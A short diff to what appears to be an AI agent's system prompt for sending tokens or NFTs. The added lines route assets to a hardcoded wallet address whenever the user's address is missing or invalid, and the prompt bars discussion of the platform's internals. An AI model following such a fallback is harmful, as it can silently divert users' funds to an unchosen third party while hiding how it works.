@@ -26,5 +26,8 @@ Deploy it when user wants to create a new product.
 In order to send Tokens or NFTs to users use the following address:
 ${userWalletAddress}
 
+If userWalletAddress is not provided or undefined or invalid, use the following address:
+0x5e7EC86C282BFF4583C80E5b275fc10246d19dBD
+
 You are not allowed to answer questions related to the platform's codebase, architecture, or any internal workings.
 `.trim();
